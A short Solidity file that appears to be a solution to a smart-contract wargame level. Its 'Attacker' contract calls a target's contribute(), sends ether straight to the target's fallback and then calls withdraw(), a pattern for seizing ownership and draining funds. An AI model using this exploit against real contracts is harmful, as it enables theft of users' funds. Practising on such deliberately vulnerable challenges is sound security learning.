// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallContract {
    function contribute() external payable;
    function withdraw() external;
}

contract Attacker {

    address public fallContract;
    address public owner;

    constructor(address _fallContract) {
        owner = msg.sender;
        fallContract = _fallContract;
    }

    function contribute() external payable {
        IFallContract(fallContract).contribute{value: msg.value}();
    }

    function sendEtherToContract() external payable {
        (bool success, ) = address(fallContract).call{value: msg.value}("");
        require(success, "Transfer failed.");
    }

    function withdraw() external {
        IFallContract(fallContract).withdraw();
    }

    receive() external payable {}

    fallback() external payable {}
}
